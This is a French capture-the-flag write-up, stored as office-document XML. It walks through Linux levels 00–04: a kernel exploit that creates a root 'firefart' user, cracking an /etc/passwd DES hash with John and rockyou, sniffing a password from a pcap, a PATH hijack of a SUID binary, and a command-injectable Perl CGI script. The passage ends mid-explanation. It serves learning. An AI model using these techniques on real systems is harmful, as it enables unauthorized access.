      <text:p text:style-name="P4">NOTE : on le nomme "hehe" car lorsqu'on le nomme "dirty", on a une <text:span text:style-name="T5">Permission Denied</text:span>. Un filtre a probablement été implémenté basé sur le nom du fichier, ce qui est du coup très simple à contourner.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">On <text:span text:style-name="T11">chmod +x</text:span> le fichier <text:span text:style-name="T5">hehe</text:span>, et on le lance, en indiquant en mot de passe "pasta". On peut ensuite se connecter en tant que l'utilisateur <text:span text:style-name="T5">firefart</text:span>, avec ce mot de passe :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images53" text:anchor-type="paragraph" svg:width="13.443cm" svg:height="5.77cm" draw:z-index="52"><draw:image xlink:href="Pictures/2000000700003482000016893D6F24B1.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P3">(Le seul truc étrange étant que l'exploit n'affiche pas son message final indiquant la réussite, et je suis obligé de CTRL+C pour en sortir).</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Bref, on a <text:span text:style-name="T5">root</text:span>, et donc <text:span text:style-name="T5">l'intégralité des flags</text:span>, y compris celui du level 00.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Je suppose qu'on était pas censé résoudre le projet de cette façon, ce qui serait bien trop simple. En continuant à chercher, on s'aperçoit qu'il existe peu de fichiers sur la machine appartenant à l'utilisateur <text:span text:style-name="T5">flag00</text:span>, mais que l'un d'entre eux est <text:span text:style-name="T5">/usr/sbin/john</text:span> (<text:span text:style-name="T11">find / -user flag00</text:span>).</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Dans ce fichier on trouve un ensemble de caractères. On essaie de les utiliser tel quel pour accéder à <text:span text:style-name="T5">flag00 </text:span>ou <text:span text:style-name="T5">level01</text:span>, mais cela ne fonctionne pas, il doit s'agir d'un cypher. On a quelques outils, y compris en ligne, qui permettent d'identifier un cypher (<text:a xlink:type="simple" xlink:href="https://www.dcode.fr/identification-chiffrement" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.dcode.fr/identification-chiffrement</text:a> ; <text:a xlink:type="simple" xlink:href="https://www.boxentriq.com/code-breaking/cipher-identifier" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.boxentriq.com/code-breaking/cipher-identifier</text:a>). On comprend qu'il s'agit probablement d'un Caesar Cipher.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On peut très simplement brute-force ce genre de ciphers en ligne (<text:a xlink:type="simple" xlink:href="https://www.dcode.fr/chiffre-cesar" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.dcode.fr/chiffre-cesar</text:a>). On a également rédigé un petit script python qui s'en occupe dans les <text:span text:style-name="T5">ressources</text:span>.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P13">✔️[OK]<text:tab/>Ressources</text:p>
      <text:p text:style-name="P13">[OK]<text:tab/>Flag</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:list xml:id="list4273897728599892524" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P48">Level 01</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">On remarque, en tant que l'utilisateur level01, cette ligne dans le fichier /etc/passwd :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr2" draw:name="images1" text:anchor-type="paragraph" svg:width="14.236cm" svg:height="1.96cm" draw:z-index="0"><draw:image xlink:href="Pictures/200000070000379C000007A7A1BD4F27.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3">On dirait bien qu'un hash de mot de passe ait été inséré directement dans le fichier <text:span text:style-name="T5">/etc/passwd</text:span>. Ce qui fonctionne, car aux débuts des systèmes UNIX, les hash étaient en effet présents dans ce fichier, et que cette possibilité a été conservée pour des raisons de <text:span text:style-name="T1">backward compatibility</text:span><text:span text:style-name="T6">. Dans l'intégralité des systèmes à peu près modernes, les hash de mots de passe sont conservés dans le fichier </text:span><text:span text:style-name="T7">/etc/shadow</text:span><text:span text:style-name="T6">, qui n'est par défaut accessible que par root.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P3"><text:span text:style-name="T6">Quoi qu'il en soit, un </text:span><text:span text:style-name="T7">hash-identifier </text:span><text:span text:style-name="T6">nous confirme qu'il s'agit ici d'un mot de passe DES Unix crypt style. On le met dans un fichier </text:span><text:span text:style-name="T7">hash </text:span><text:span text:style-name="T6">puis on le crack avec John et rockyou.txt :</text:span></text:p>
      <text:p text:style-name="P4"><text:soft-page-break/></text:p>
      <text:p text:style-name="P7">john --wordlist=/usr/share/wordlists/rockyou.txt hash</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr2" draw:name="images2" text:anchor-type="paragraph" svg:width="7.781cm" svg:height="1.984cm" draw:z-index="1"><draw:image xlink:href="Pictures/2000000700001E64000007C17C337FAF.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3">Si l'on ne souhaite pas passer par <text:span text:style-name="T5">john </text:span>ou <text:span text:style-name="T5">hashcat</text:span>, un petit script python de crack DES est présent dans les ressources.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Ce mot de passe nous permet bien de nous connecter en temps que <text:span text:style-name="T5">flag01</text:span>. On récupère ce flag, et on peut passer à <text:span text:style-name="T5">level02</text:span>.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P13">✔️[OK]<text:tab/>Ressources</text:p>
      <text:p text:style-name="P13">[OK]<text:tab/>Flag</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:list xml:id="list5996440231375293226" text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P49">Level 02</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P4">Dans le home directory du level02, on trouve un seul fichier, <text:span text:style-name="T11">level02.pcap</text:span>. On a déjà eu affaire à ce genre de fichiers (voir <text:span text:style-name="T5">Cap</text:span>, HackTheBox_Shocker10.odt). Ce genre de fichier contient les données des packets transitant par un réseau, qu'on a capturé par exemple avec Wireshark ou un logiciel de ce type.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Et justement, ce genre de fichier peut s'analyser avec <text:span text:style-name="T5">Wireshark</text:span>. En l'ouvrant, on trouve des packets représentant une connexion TCP entre <text:span text:style-name="T11">59.233.235.223</text:span> et <text:span text:style-name="T11">59.233.235.218</text:span> (avec <text:span text:style-name="T11">SYN</text:span> puis <text:span text:style-name="T11">SYN ACK</text:span> dans les premiers paquets, et <text:span text:style-name="T11">FIN</text:span> puis <text:span text:style-name="T11">FIN ACK</text:span> dans les derniers).</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">On s'aperçoit que le paquet 43 contient 13 bytes de données, la string "<text:span text:style-name="T11">Password: </text:span>". Le mot de passe se trouve donc potentiellement dans les paquets suivants. On ignore les paquets ACK venant de la destination (<text:span text:style-name="T11">59.233.235.223</text:span>), qui ne font que confirmer la réception des paquets contenant le mot de passe.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Les autres paquets ne contiennent étrangement qu'un seul byte à chaque fois :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr3" draw:name="images4" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="6.228cm" draw:z-index="3"><draw:image xlink:href="Pictures/2000000700005EC7000022BB862B4B01.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P4">Ici, ce paquet contient la lettre '<text:span text:style-name="T10">f</text:span>'.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><text:soft-page-break/>Il est possible que le mot de passe soit transmis byte par byte ; en ignorant toujours les paquets ACK de réception de la cible, on récupère les lettres suivantes, une par une :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P7">ft_wandrNDRelL0L</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Suivi d'un message envoyé par la cible, "<text:span text:style-name="T11">Login incorrect</text:span>". On essaie directement ce mot de passe, qui ne fonctionne pas. Avec un peu de <text:span text:style-name="T1">trial and error</text:span>, on finit par trouver un mot de passe fonctionnel pour se connecter en tant que <text:span text:style-name="T5">flag02</text:span> : <text:span text:style-name="T11">ft_waNDReL0L</text:span> (NDR faisant référence justement à l'analyse des paquets réseau, <text:span text:style-name="T1">Network Detection and Response</text:span>).</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">D'ailleurs, si les lettres du mot de passe étaient transmises une par une, c'est probablement de par l'envoi de paquets PSH,ACK :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr4" draw:name="images5" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="1.042cm" draw:z-index="4"><draw:image xlink:href="Pictures/2000000700007E33000007C1E257B8C2.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P4"><text:a xlink:type="simple" xlink:href="https://serverfault.com/questions/614590/what-is-psh-ack-doing-during-my-connection-to-a-global-catalog-server" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://serverfault.com/questions/614590/what-is-psh-ack-doing-during-my-connection-to-a-global-catalog-server</text:a></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P10"><text:span text:style-name="T8">"The Push flag tells the receiver's network stack to 'push' the data straight to the receiving socket, and not to wait for any more packets before doing so. [...] </text:span>A latency-sensitive application does not want to wait around for TCP's efficiency delays so the application will usually disable them, causing data to be sent as quick as possible with a Push flag set. On Linux, this is done with the <text:span text:style-name="Source_20_Text">setsockopt()</text:span> flags <text:span text:style-name="Source_20_Text">TCP_QUICKACK</text:span> and <text:span text:style-name="Source_20_Text">TCP_NODELAY</text:span>."</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Cela rend l'examen des paquets légèrement plus pénible. Quoi qu'il en soit, on récupère notre flag et on passe au <text:span text:style-name="T5">level03</text:span>.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P13">✔️[OK]<text:tab/>Ressources</text:p>
      <text:p text:style-name="P14">[OK]<text:tab/>Flag</text:p>
      <text:p text:style-name="P4"/>
      <text:list xml:id="list5051273321382558116" text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P50">Level 03</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">En se connectant, on aperçoit dans le dossier <text:span text:style-name="T5">home </text:span>de l'utilisateur un seul fichier, qui est un exécutable ELF32, SUID et SGID :</text:p>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images6" text:anchor-type="paragraph" svg:width="18.399cm" svg:height="4.45cm" draw:z-index="5"><draw:image xlink:href="Pictures/2000000700005CB60000166EEC8B04C8.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P4">Avant d'aller plus loin, un petit point sur SUID / SGID pour être plus clair (<text:a xlink:type="simple" xlink:href="https://stackoverflow.com/questions/32455684/difference-between-real-user-id-effective-user-id-and-saved-user-id" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">tiré d'ici</text:a>).</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P19"><text:span text:style-name="Strong_20_Emphasis">Part 1: Understand UID and GID</text:span></text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20">I'll log into a shell with my credentials and run:</text:p>
      <text:p text:style-name="P24"><text:span text:style-name="Source_20_Text"/></text:p>
      <text:p text:style-name="P24"><text:soft-page-break/><text:span text:style-name="Source_20_Text">$ grep $LOGNAME /etc/passwd</text:span></text:p>
      <text:p text:style-name="P24"><text:span text:style-name="Source_20_Text">rotem:x:1000:1000:rotem,,,:/home/rotem:/bin/bash</text:span></text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20">You can see my logname (rotem), the <text:span text:style-name="Strong_20_Emphasis">UID</text:span> and <text:span text:style-name="Strong_20_Emphasis">GID</text:span> which are both 1000, and other details like the shell I'm logged into.</text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20"><text:span text:style-name="Strong_20_Emphasis">Part 2: Understand RUID and RGID</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="Emphasis"/></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="Emphasis"><text:span text:style-name="T6">Every process has an owner and belongs to a group</text:span></text:span><text:span text:style-name="T6">.</text:span> In our shell, every process that we'll now run will inherit the privileges of my user account and will run with the same UID and GID. Let's run a simple command to check it:</text:p>
      <text:p text:style-name="P24"><text:span text:style-name="Source_20_Text">$ sleep 10 &amp; ps aux | grep 'sleep'</text:span></text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20">And check for the process UID and GID:</text:p>
      <text:p text:style-name="P24"><text:span text:style-name="Source_20_Text">$ stat -c "%u %g" /proc/$pid/</text:span></text:p>
      <text:p text:style-name="P24"><text:span text:style-name="Source_20_Text">1000 1000</text:span></text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20">Those are the <text:span text:style-name="Strong_20_Emphasis">real</text:span> <text:span text:style-name="Strong_20_Emphasis">user ID</text:span> (<text:span text:style-name="Source_20_Text">RUID</text:span>) and real <text:span text:style-name="Strong_20_Emphasis">group ID</text:span> (<text:span text:style-name="Source_20_Text">RGID</text:span>) of the <text:span text:style-name="Strong_20_Emphasis">process</text:span>. For now, accept the fact that the <text:span text:style-name="Source_20_Text">EUID</text:span> and <text:span text:style-name="Source_20_Text">EGID</text:span> attributes are 'redundant' and just equals to <text:span text:style-name="Source_20_Text">RUID</text:span> and <text:span text:style-name="Source_20_Text">RGID</text:span> behind the scenes.</text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20"><text:span text:style-name="Strong_20_Emphasis">Part 3: Understand EUID and EGID</text:span></text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20">Let's take the <text:span text:style-name="Source_20_Text">ping</text:span> command as an example. Search for the binary location with the <text:span text:style-name="Source_20_Text">which</text:span> command then run <text:span text:style-name="Source_20_Text">ls -la</text:span>:</text:p>
      <text:p text:style-name="P24"><text:span text:style-name="Source_20_Text">-rwsr-xr-x <text:s/>1 root root <text:s text:c="2"/>64424 Mar 10 <text:s/>2017 <text:s/>ping</text:span></text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20">You can see that the owner and the group of the file are <text:span text:style-name="Source_20_Text">root</text:span>. This is because the <text:span text:style-name="Source_20_Text">ping</text:span> command needs to open up a socket and the Linux kernel demands <text:span text:style-name="Source_20_Text">root</text:span> privilege for that. But how can I use <text:span text:style-name="Source_20_Text">ping</text:span> if I don't have <text:span text:style-name="Source_20_Text">root</text:span> privilege? Notice the <text:span text:style-name="Strong_20_Emphasis">'s'</text:span> letter instead of 'x' in the owner part of the file permission. This is a special permission bit for specific binary executable files (like <text:span text:style-name="Source_20_Text">ping</text:span> and <text:span text:style-name="Source_20_Text">sudo</text:span>) which is known as <text:span text:style-name="Strong_20_Emphasis">setuid</text:span>. This is where <text:span text:style-name="Source_20_Text">EUID</text:span> and <text:span text:style-name="Source_20_Text">EGID</text:span> come into play.</text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20">What will happen is when a <text:span text:style-name="Strong_20_Emphasis">setuid</text:span> binary like <text:span text:style-name="Source_20_Text">ping</text:span> executes, <text:span text:style-name="Strong_20_Emphasis">the process changes its Effective </text:span><text:span text:style-name="Strong_20_Emphasis">User ID (</text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="Source_20_Text">EUID</text:span></text:span><text:span text:style-name="Strong_20_Emphasis">) from the default </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="Source_20_Text">RUID</text:span></text:span><text:span text:style-name="Strong_20_Emphasis"> to the owner of this special binary executable file which in this case is - </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T18">root</text:span></text:span></text:span>.</text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20">This is all done by the simple fact that this file has the <text:span text:style-name="Source_20_Text">setuid</text:span> bit. The kernel makes the decision whether this process has the privilege by looking on the <text:span text:style-name="Source_20_Text">EUID</text:span> of the process. Because now the <text:span text:style-name="Source_20_Text">EUID</text:span> points to <text:span text:style-name="Source_20_Text">root</text:span>, the operation won't be rejected by the kernel.</text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20"><text:span text:style-name="Strong_20_Emphasis">Part 4: What about SUID and SGID?</text:span></text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20">The Saved user ID (<text:span text:style-name="Source_20_Text">SUID</text:span>) is being used when a privileged process is running (as <text:span text:style-name="Source_20_Text">root</text:span> for example) and it needs to do some unprivileged tasks temporarily; changing <text:span text:style-name="Source_20_Text">euid</text:span> from a privileged value (typically <text:span text:style-name="Source_20_Text">0</text:span>) to some unprivileged value (anything other than the privileged value) causes the privileged value to be stored in <text:span text:style-name="Source_20_Text">suid</text:span>. Later, a program's <text:span text:style-name="Source_20_Text">euid</text:span> can be set back to the value stored in <text:span text:style-name="Source_20_Text">suid</text:span>, so that elevated privileges can be restored.</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P20"><text:soft-page-break/></text:p>
      <text:p text:style-name="P20">Ici, le programme a pour propriétaire <text:span text:style-name="T5">flag03</text:span><text:span text:style-name="T18">, et pour groupe </text:span><text:span text:style-name="T5">level03</text:span><text:span text:style-name="T18">. Cela veut dire que, lorsqu'exécuté, le binaire aura pour effective UID / GID, flag03 et level03. C'est intéressant pour nous car si on arrive à faire exécuter des commandes </text:span><text:span text:style-name="T5">system</text:span><text:span text:style-name="T18">, celles-ci seront exécutées en tant que l'utilisateur </text:span><text:span text:style-name="T5">flag03</text:span><text:span text:style-name="T18">.</text:span></text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P21">Pour l'instant, on ne dispose que de l'exécutable. Lorsqu'on le fait tourner, un simple message "Exploit me" apparaît :</text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P21"><draw:frame draw:style-name="fr2" draw:name="images7" text:anchor-type="paragraph" svg:width="7.331cm" svg:height="1.005cm" draw:z-index="6"><draw:image xlink:href="Pictures/2000000700001CA2000003EE387439E8.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P18">On transfère le binaire sur notre machine Kali, et on le désassemble avec <text:span text:style-name="T5">ghidra</text:span>. A part les fonctions standards de la libc, on ne voit qu'une fonction <text:span text:style-name="T5">main</text:span>, qui ressemble à ça :</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18"><draw:frame draw:style-name="fr5" draw:name="images3" text:anchor-type="paragraph" svg:x="2.54cm" svg:y="0.069cm" svg:width="11.832cm" svg:height="7.557cm" draw:z-index="2"><draw:image xlink:href="Pictures/200000070000313300001F6C552E520B.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P4">(Les fonctions setresuid() et setresgid() permettent de définir, avec une seule fonction, les real IDs, effective IDs, et saved IDs. Je me demande un peu quelle utilité il y a de fixer ici ces trois ID à l'ID effectif du processus, qui est flag03 pour EUID et level03 pour EGID. Peut-être que c'est pour que la commande system utilise bien le EUID flag03, mais normalement lors d'un fork les real IDs et les effective IDs ne sont pas modifiés).</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Quoi qu'il en soit, le plus important est de remarquer ici que ce programme exécute une commande <text:span text:style-name="T5">system </text:span>:</text:p>
      <text:p text:style-name="P7">/usr/bin/env echo Exploit me</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">On peut envisager ici un <text:span text:style-name="T5">path highjack</text:span>. Celui-ci sera impossible pour la commande <text:span text:style-name="T11">/usr/bin/env</text:span>, dont le full path est indiqué.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Qu'en est-il cependant de la commande <text:span text:style-name="T5">echo</text:span> ? Lorsqu'on tape <text:span text:style-name="T11">which echo</text:span>, on a le résultat /bin/echo :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr2" draw:name="images8" text:anchor-type="paragraph" svg:width="7.569cm" svg:height="1.589cm" draw:z-index="7"><draw:image xlink:href="Pictures/2000000700001D90000006354FB75889.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P4"><text:soft-page-break/>Ce qui peut sembler étonnant, car <text:span text:style-name="T5">echo </text:span>est connu pour être un <text:span text:style-name="T1">shell builtin</text:span>. On trouve la réponse ici :</text:p>
      <text:p text:style-name="P4"><text:a xlink:type="simple" xlink:href="https://askubuntu.com/questions/960822/why-is-there-a-bin-echo-and-why-would-i-want-to-use-it" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://askubuntu.com/questions/960822/why-is-there-a-bin-echo-and-why-would-i-want-to-use-it</text:a> </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">"<text:span text:style-name="T1">If you open up a bash prompt and type in an echo command, that uses a shell builtin rather than running /bin/echo. The reasons it is still important for /bin/echo to exist are:</text:span></text:p>
      <text:list xml:id="list9023962347757709968" text:style-name="L5">
        <text:list-item>
          <text:p text:style-name="P51">You're not always using a shell. Under a variety of circumstances, you run an executable directly and not through a shell.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P51">At least in theory, some shells don't have an echo builtin. This is not actually required.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P4"><text:span text:style-name="T1">Besides find with -exec or -exec dir, the </text:span><text:span text:style-name="T12">/bin/echo</text:span><text:span text:style-name="T1"> executable </text:span><text:span text:style-name="T2">will be called by other programs that themselves run programs but not through a shell</text:span><text:span text:style-name="T1">.</text:span>"</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Comme on vient de le souligner, un programme exécutant des commandes mais pas à partir d'une shell n'utilisent pas <text:span text:style-name="T5">echo </text:span>comme un builtin, mais bien comme un binaire. Ainsi, pour cela, ils vont, pour trouver le bon binaire, utiliser la variable d'environnement <text:span text:style-name="T5">$PATH</text:span>. Notre plan d'action est donc le suivant :</text:p>
      <text:p text:style-name="P4">&gt; Modifier notre variable $PATH actuelle pour y placer en premier un dossier qu'on contrôle, comme /tmp</text:p>
      <text:p text:style-name="P4">&gt; Placer dans ce dossier un script bash (avec les droits d'exécution) appelé justement <text:span text:style-name="T5">echo</text:span>.</text:p>
      <text:p text:style-name="P4">&gt; Lorsque le programme level03 en SUID cherchera à faire exécuter à <text:span text:style-name="T5">env</text:span> son <text:span text:style-name="T5">echo</text:span>, il s'agira de notre <text:span text:style-name="T11">/tmp/echo</text:span> qui sera exécuté au lieu de <text:span text:style-name="T11">/bin/echo</text:span>.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Le plan d'action, en action :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr4" draw:name="images9" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="4.713cm" draw:z-index="8"><draw:image xlink:href="Pictures/20000007000047F0000013F363BCAB6A.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">On récupère le mot de passe du compte <text:span text:style-name="T5">flag03</text:span>, on récupère le flag, puis on passe au <text:span text:style-name="T5">level04</text:span>.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P13">✔️[OK]<text:tab/>Ressources</text:p>
      <text:p text:style-name="P14">[OK]<text:tab/>Flag</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P4"/>
      <text:list xml:id="list2099091667046931694" text:style-name="L6">
        <text:list-item>
          <text:p text:style-name="P52">Level 04</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Dans le dossier home de l'utilisateur, on trouve un fichier <text:span text:style-name="T11">level04.pl</text:span>, qui est SUID. On affiche en même temps son contenu, et on voit qu'il s'agit d'un script CGI écrit en PERL.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images10" text:anchor-type="paragraph" svg:width="14.607cm" svg:height="8.625cm" draw:z-index="9"><draw:image xlink:href="Pictures/200000070000390E000021B21BE4C3D5.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P4">Globalement, un CGI est un programme qui prend en entrée des requêtes HTML, et renvoie des réponses HTML. Plusieurs langages sont disponibles pour effectuer de telles actions, et même si PERL n'est plus vraiment à la mode, il s'agit d'un langage qui peut toujours être utilisé. La package CGI.pm est utilisé ici, qui facilite justement l'utilisation de PERL pour des comportements de CGI.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Pour plus d'informations sur PERL en tant que CGI, et comment l'activer sur un serveur apache2, voir :</text:p>
      <text:p text:style-name="P4"><text:a xlink:type="simple" xlink:href="https://www.perl.com/article/perl-and-cgi/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.perl.com/article/perl-and-cgi/</text:a> </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">D'ailleurs on voit bien, dans la configuration du serveur apache2 qui tourne sur la box, que le port 4747 prend le script PERL en directory index, et exécute tous les fichiers .pl. Bref, le port 4747 sert le scrit PERL, et SuexecUserGroup nous informe qu'il est exécuté en tant que <text:span text:style-name="T5">flag04</text:span>.</text:p>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images11" text:anchor-type="paragraph" svg:width="13.213cm" svg:height="5.33cm" draw:z-index="10"><draw:image xlink:href="Pictures/2000000700003BF300001830C2D88949.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Si l'on réussit donc à injecter une commande pour la faire exécuter au script CGI qui tourne sur le port 4747, on pourra exécuter une commande en tant que <text:span text:style-name="T5">flag04</text:span>.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Pour expliquer un peu le contenu du script PERL CGI, voir :</text:p>
      <text:p text:style-name="P4"><text:a xlink:type="simple" xlink:href="https://www.hobbesworld.com/perl/cgi.php" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.hobbesworld.com/perl/cgi.php</text:a> </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">De manière générale, un script CGI en PERL doit print le <text:span text:style-name="T5">content-type</text:span> pour éviter une erreur 500, mais on est ensuite relativement libre.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><text:soft-page-break/>Que fait notre script en l'occurence dans sa fonction <text:span text:style-name="T5">x</text:span> ? Rappelons le script :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P31">#!/usr/bin/perl</text:p>
      <text:p text:style-name="P32"># localhost:4747</text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T19">use</text:span> <text:span text:style-name="T20">CGI</text:span> <text:span text:style-name="T22">qw{param}</text:span><text:span text:style-name="T20">;</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T19">print</text:span> <text:span text:style-name="T23">"Content-type: text/html\n\n"</text:span><text:span text:style-name="T20">;</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T19">sub </text:span><text:span text:style-name="T25">x</text:span> <text:span text:style-name="T20">{</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T26">$y</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T26">$_</text:span><text:span text:style-name="T20">[</text:span><text:span text:style-name="T27">0</text:span><text:span text:style-name="T20">];</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T19">print</text:span> <text:span text:style-name="T23">`echo $y 2&gt;&amp;1`</text:span><text:span text:style-name="T20">;</text:span></text:p>
      <text:p text:style-name="P34">}</text:p>
      <text:p text:style-name="P26"><text:span text:style-name="T20">x(param(</text:span><text:span text:style-name="T23">"x"</text:span><text:span text:style-name="T20">));</text:span></text:p>
      <text:p text:style-name="P4">Le <text:span text:style-name="T11">qw{param}</text:span> permet au script CGI d'avoir accès aux paramètres d'URL. Considérons l'URL suivante :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><text:span text:style-name="T11">http://192.168.1.16:4747/?</text:span>x=hello</text:p>
      <text:p text:style-name="P4"/>
